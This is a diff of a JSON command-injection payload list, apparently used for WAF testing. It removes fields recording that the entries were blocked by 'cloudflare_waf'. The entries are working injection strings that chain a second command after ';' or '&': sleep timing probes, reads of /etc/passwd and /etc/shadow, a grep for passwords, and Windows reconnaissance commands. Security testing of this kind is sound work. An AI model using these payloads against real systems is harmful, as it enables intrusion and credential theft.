-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3088",
@@ -1228,12 +739,7 @@
       "payload": "; ruby -e 'sleep 5'",
       "description": "Ruby sleep",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3089",
@@ -1242,12 +748,7 @@
       "payload": "; php -r 'sleep(5);'",
       "description": "PHP sleep",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3090",
@@ -1256,12 +757,7 @@
       "payload": "; node -e 'setTimeout(function(){},5000)'",
       "description": "Node setTimeout",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3091",
@@ -1270,12 +766,7 @@
       "payload": "; powershell Start-Sleep -s 5",
       "description": "PowerShell sleep",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3092",
@@ -1284,12 +775,7 @@
       "payload": "; timeout /t 5",
       "description": "Windows timeout",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3093",
@@ -1298,12 +784,7 @@
       "payload": "; waitfor /t 5 pause",
       "description": "Windows waitfor",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3094",
@@ -1312,12 +793,7 @@
       "payload": "; choice /t 5 /d y",
       "description": "Windows choice",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3095",
@@ -1326,12 +802,7 @@
       "payload": "; ping -n 5 127.0.0.1",
       "description": "Windows ping",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3096",
@@ -1340,12 +811,7 @@
       "payload": "; cat /etc/passwd",
       "description": "Cat passwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3097",
@@ -1354,12 +820,7 @@
       "payload": "; cat /etc/shadow",
       "description": "Cat shadow",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3098",
@@ -1368,12 +829,7 @@
       "payload": "; cat /etc/hosts",
       "description": "Cat hosts",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3099",
@@ -1382,12 +838,7 @@
       "payload": "; cat /proc/version",
       "description": "Cat proc version",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3100",
@@ -1396,12 +847,7 @@
       "payload": "; cat /proc/cpuinfo",
       "description": "Cat cpuinfo",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3101",
@@ -1410,12 +856,7 @@
       "payload": "; ls -la /",
       "description": "Ls root",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3102",
@@ -1424,12 +865,7 @@
       "payload": "; ls -la /home",
       "description": "Ls home",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3103",
@@ -1438,12 +874,7 @@
       "payload": "; ls -la /var/www",
       "description": "Ls www",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3104",
@@ -1452,12 +883,7 @@
       "payload": "; find / -name \"*.conf\"",
       "description": "Find conf files",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3105",
@@ -1466,12 +892,7 @@
       "payload": "; grep -r \"password\" /etc",
       "description": "Grep password",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3106",
@@ -1480,12 +901,7 @@
       "payload": "& dir",
       "description": "Windows dir",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3107",
@@ -1494,12 +910,7 @@
       "payload": "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
       "description": "Windows type hosts",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3108",
@@ -1508,26 +919,7 @@
       "payload": "& ipconfig",
       "description": "Windows ipconfig",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "cmdi-3109",
-      "category": "command_injection",
-      "subcategory": "comprehensive",
-      "payload": "& whoami",
-      "description": "Windows whoami",
-      "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3110",
@@ -1536,12 +928,7 @@
       "payload": "& net user",
       "description": "Windows net user",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3111",
@@ -1550,12 +937,7 @@
       "payload": "& net localgroup administrators",
       "description": "Windows administrators",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3112",
@@ -1564,12 +946,7 @@
       "payload": "& systeminfo",
       "description": "Windows systeminfo",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3113",
@@ -1578,12 +955,7 @@
       "payload": "& tasklist",
       "description": "Windows tasklist",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3114",
@@ -1592,12 +964,7 @@
       "payload": "& netstat -an",
       "description": "Windows netstat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3115",
@@ -1606,12 +973,7 @@
       "payload": "& reg query HKLM\\Software",
       "description": "Windows reg query",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     }
   ]
 }
